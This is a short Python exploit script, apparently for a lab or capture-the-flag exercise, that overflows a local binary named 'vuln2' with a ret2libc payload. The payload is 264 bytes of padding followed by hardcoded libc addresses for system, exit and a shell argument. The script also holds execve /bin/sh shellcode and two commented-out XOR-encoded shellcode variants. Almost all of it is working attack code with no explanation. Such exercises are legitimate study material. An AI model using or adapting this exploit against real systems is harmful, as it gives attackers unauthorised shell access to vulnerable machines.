eip = 0xbffff5cc

import struct
import subprocess

# libc = b7dd8000
# system offset = 00044630
# exit offset = 000373a0
# arg = 0xb7f60406

sc = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
#sc = "\x4d\x31\xc0\x41\xb1\x3c\xeb\x1a\x58\x48\x31\xc9\x48\x31\xdb\x8a\x1c\x08\x4c\x39\xc3\x74\x10\x44\x30\xcb\x88\x1c\x08\x48\xff\xc1\xeb\xed\xe8\xe1\xff\xff\xff\x74\x0d\xfc\x74\xbf\xfc\x4d\x74\x0d\xc3\x74\x0d\xca\x33\x39\xd7\x2e\x74\x0d\xfc\x74\xbf\xfc\x07\x63\x74\x0d\xee\x6e\x6b\x74\xb5\xda\x33\x39\xd4\xd5\xc3\xc3\xc3\x13\x5e\x55\x52\x13\x46\x4f\x54"
#sc = "\xeb\x0d\x5e\x31\xc9\xb1\x21\x80\x36\x35\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff\x5f\x73\x6d\x04\xee\x04\xfc\xf8\xb5\x04\xe7\x5f\x3e\x6d\x67\x5d\x1a\x4f\x46\x5d\x5d\x1a\x57\x5c\x5b\xbc\xd6\x67\x66\xbc\xd4\xf8\xb5"
# JUNK + RETADDR + NOP + SC
libc = 0xb7dd8000
system = libc + 0x44630
exit = libc + 0x373a0
system_arg = 0xb7f60406

# JUNK + SYSTEM + EXIT + SYSTEM_ARG
buf = "A" * 264
buf += struct.pack("<I",system)
buf += struct.pack("<I",exit)
buf += struct.pack("<I",system_arg)

subprocess.call(["./vuln2", buf])
